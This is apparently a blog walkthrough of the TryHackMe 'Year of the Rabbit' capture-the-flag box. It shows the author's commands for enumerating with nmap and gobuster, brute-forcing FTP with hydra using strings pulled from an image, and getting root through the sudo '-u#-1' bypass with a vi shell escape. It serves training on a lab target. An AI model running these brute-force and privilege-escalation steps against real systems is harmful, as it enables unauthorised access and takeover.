---
title: "Year of the Rabbit"
datePublished: Mon Jul 14 2025 20:35:26 GMT+0000 (Coordinated Universal Time)
cuid: cmd3kbw0q000j02js1f8bcdhf
slug: year-of-the-rabbit
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1752525273217/4ebdf9e3-2f69-4696-a041-217a72697365.png
tags: nmap, strings, steganography, tryhackme, burpsuite, gobuster, ctf-writeup, webpentesting

---

Welcome to the "Year of the Rabbit" — a lighthearted CTF-style box that offers a balanced mix of enumeration, basic exploitation, steganography, and privilege escalation to warm up your hacking skills for the new year. In this walkthrough, we’ll use tools like **Nmap**, **Gobuster**, **Burpsuite**, **Hydra**, and **Steghide** to uncover hidden paths, credentials, and ultimately obtain both the user and root flags. Along the way, we’ll practice privilege escalation techniques and learn how seemingly small clues can lead to full system compromise. Let's dive in without falling down the rabbit hole. 🐇

## Flags

![](https://i.imgur.com/LmK6uGc.png align="left")

Let's have a nice gentle start to the New Year!  
Can you hack into the Year of the Rabbit box without falling down a hole?

***(Please ensure your volume is turned up!)***

### Answer the questions below  

To start off we’ll enumarate and find some hints that might help us find some users, their passwords and probably leads to flags like files or paths.

nmap -sV IP\_Address

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752523427125/0fe954f4-e832-4a09-93a8-63003a2c0238.png align="center")

`gobuster dir -u http://IP_Address -w /usr/share/wordlists/dirb/common.txt`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752523464752/a2a38ea4-c53e-4971-81f1-2a90b9ac41c8.png align="center")

checking under assets on the browser their are two files a css and mp4 file. On clicking the css file there’s an hint of a php file. Trying to switching into the php file it gives an alert to turn off Javascript and it also behaves like a folder path instead of a file  

* `/sup3r_s3cr3t_fl4g.php` && directory: `sup3r_s3cret_fl4g`
    
* [Rick Astley](https://www.youtube.com/watch?v=dQw4w9WgXcQ) [- **Never Go**](https://www.youtube.com/watch?v=dQw4w9WgXcQ)**nna Give You Up: the MP4 video under assets (not much helpful)**
    

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752523578241/67b45567-23cb-4e16-a41a-dad7f9152545.png align="center")

trying to check further using gobuster there’s no much helpful hints

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752523613498/0ea50402-accf-4c74-a479-588b7a5c0b01.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752523757635/8760d858-d2e2-412e-a2ea-49c2816ab921.png align="center")

We’ll try using Burpsuite to intercept, as usual open Burpsuite and under proxy settings allow the browser option. Turn on the intercept and open the browser http://10.10.231.51:80 then add the path to our php file `/sup3r_s3cr3t_fl4g.php` then give it some time and check the responses under the raw section. A hidden path will be revealed.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752523820830/706a0462-6911-4205-94a3-0beb2d119341.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752524002466/9746d167-c4a4-453c-aafa-2092bc87749a.png align="center")

Going back to our browser and switching to this path, we find an image which we’ll download it.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752524026563/42e45612-da69-40f7-9d7c-4b5fe3297955.png align="center")

`wget -q http://10.10.84.15/WExYY2Cv-qU/Hot_Babe.png`  
  
tried using `steghide extract -sf Hot_Babe.png` but was not successful opted to use `strings`

  
`strings Hot_Babe.png`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752524094305/59cdd8d0-c6e1-4fd8-9714-178ae50858ee.png align="center")

  
this reveals a user called ftpuser and a list of possible passwords which we’ll paste into a file inorder to use as our `wordlist` to find the user’s password using `hydra`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752524270493/be1ad7c0-d122-48e7-9c14-4fe4438c6dec.png align="center")

`hydra -l ftpuser -P userpas.txt ftp://10.10.84.15`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752524303016/0860e3ed-579e-40c9-a8e3-4e8a56674af6.png align="center")

when we login into `ftp IP_Address` using the username and password. We get a file that reveals new user and their password.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752524410311/eaea551d-b889-4130-aa50-208ff892edc0.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752524438379/b2d7cc6b-f4df-46eb-adbd-ede0e9e7aae6.png align="center")

  
we’ll login using ssh  

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752524499084/471fb3df-a9ff-47cf-8b7a-f853eeeaef5f.png align="center")

  
trying to find the user.txt file for the user flag and we’re shown the path where it’s found but we don’t have permission to read it.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752524600719/a510b615-b193-489d-ab6e-74b3593d34a3.png align="center")

Remember the ssh revealed something: `s3cr3t`

```bash
1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE
```

1. What is the user flag?
    
      
    `find / -iname 's3cr3t' 2>/dev/null`  
    
    `ls -la`
    
    `cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752524955604/ca58ce71-6e98-41c7-a67c-f27d6055410b.png align="center")
    
    `su - gwendoline`  
      
    `cat user.txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752524820260/495721b2-8d4a-4ebc-9e58-fe9d2524b1c8.png align="center")
    
2. What is the root flag?  
    
    `sudo -l`  
    
    `sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt`
    
    type:  
    
    `:!/bin/sh`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752525081804/852eb119-3b98-417b-b942-d12e04f25981.png align="center")
    
      
    `find / -type f -name root.txt 2>/dev/null`  
    
    `cat /root/root.txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1752525156568/b938796f-0f71-4392-8f52-62162bbfa636.png align="center")
    

The “Year of the Rabbit” box was a great exercise in applying foundational skills in web enumeration, FTP/SSH access, steganography, and privilege escalation. Starting with simple recon using **Nmap** and **Gobuster**, we uncovered hidden paths and files. The combination of **Burpsuite interception** and **strings analysis** on an image led us to valid credentials, which then opened the door to further lateral movement. A hidden message hinted at a concealed file, and with **user switching and SUID abuse via** `vi`, we escalated privileges and captured the **root flag**. This challenge was a great reminder of how attention to detail and layered enumeration can lead to full system pwnage. 🎯🐰